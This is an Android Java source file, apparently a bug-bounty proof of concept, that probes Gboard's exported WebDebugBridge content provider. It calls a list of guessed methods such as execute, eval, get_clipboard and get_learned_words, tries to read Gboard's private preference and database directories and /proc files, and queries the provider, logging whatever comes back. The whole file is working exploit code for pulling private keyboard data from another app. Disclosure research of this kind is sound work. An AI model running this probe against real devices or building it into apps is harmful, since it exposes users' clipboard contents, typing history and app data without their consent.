package com.vrp.poc;

import android.app.Activity;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class GboardDebugBridgeActivity extends Activity {
    private static final String TAG = "GboardDebugBridge";
    private static final String AUTHORITY = "com.google.android.inputmethod.latin.wdb";
    private static final Uri PROVIDER_URI = Uri.parse("content://" + AUTHORITY);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(android.R.layout.simple_list_item_1);
        new Thread(this::runExploit).start();
    }

    private void runExploit() {
        Log.d(TAG, "=== Gboard WebDebugBridgeContentProvider Exploit PoC ===");
        Log.d(TAG, "Authority: " + AUTHORITY);
        Log.d(TAG, "Provider: exported=true, NO manifest permission");
        Log.d(TAG, "Protection: code-level signature check (testing bypass)");

        testCallMethods();
        testFileRead();
        testQuery();
    }

    private Bundle callProvider(String method, String arg, Bundle extras) {
        try {
            Bundle result = getContentResolver().call(PROVIDER_URI, method, arg, extras);
            return result;
        } catch (Exception e) {
            Log.d(TAG, "[EXCEPTION] " + method + ": " + e.getClass().getSimpleName() + " - " + e.getMessage());
            return null;
        }
    }

    private void logResult(String label, Bundle result) {
        if (result == null) {
            Log.d(TAG, "[NULL] " + label);
            return;
        }
        Log.d(TAG, "[RESULT] " + label + ": keys=" + result.keySet());
        for (String key : result.keySet()) {
            Object val = result.get(key);
            if (val != null) {
                String s = val.toString();
                Log.d(TAG, "  " + key + "=" + s.substring(0, Math.min(200, s.length())));
            }
        }
    }

    private void testCallMethods() {
        Log.d(TAG, "\n--- Phase 1: Test call() methods ---");
        String[] methods = {
            "get_status", "status", "get_info", "info",
            "get_config", "config", "list", "help",
            "get_logs", "logs", "get_data", "data",
            "execute", "run", "eval", "debug",
            "read_file", "write_file", "get_file",
            "get_clipboard", "clipboard", "get_predictions",
            "get_dictionary", "dictionary", "get_learned_words",
        };
        for (String method : methods) {
            Bundle result = callProvider(method, null, null);
            logResult("call_" + method, result);
        }
    }

    private void testFileRead() {
        Log.d(TAG, "\n--- Phase 2: Test file read via call() ---");
        String[] files = {
            "/data/data/com.google.android.inputmethod.latin/shared_prefs/",
            "/data/data/com.google.android.inputmethod.latin/databases/",
            "/proc/self/cmdline",
            "/proc/self/maps",
        };
        for (String file : files) {
            Bundle extras = new Bundle();
            extras.putString("file", file);
            Bundle result = callProvider("read_file", file, extras);
            logResult("file_" + file, result);
        }
    }

    private void testQuery() {
        Log.d(TAG, "\n--- Phase 3: Test query() ---");
        try {
            android.database.Cursor c = getContentResolver().query(
                PROVIDER_URI, null, null, null, null);
            if (c != null) {
                Log.d(TAG, "[QUERY] rows=" + c.getCount() + " cols=" + c.getColumnCount());
                String[] cols = c.getColumnNames();
                StringBuilder colStr = new StringBuilder();
                for (String col : cols) colStr.append(col).append(", ");
                Log.d(TAG, "[QUERY] columns: " + colStr);
                while (c.moveToNext()) {
                    StringBuilder row = new StringBuilder();
                    for (int i = 0; i < Math.min(cols.length, 5); i++) {
                        try { row.append(cols[i]).append("=").append(c.getString(i)).append(" | "); }
                        catch (Exception e) { row.append(cols[i]).append("=[err] | "); }
                    }
                    Log.d(TAG, "[ROW] " + row);
                }
                c.close();
            } else {
                Log.d(TAG, "[QUERY] cursor=null");
            }
        } catch (Exception e) {
            Log.d(TAG, "[QUERY_ERROR] " + e);
        }
        Log.d(TAG, "\n=== Gboard WebDebugBridge PoC Complete ===");
    }
}
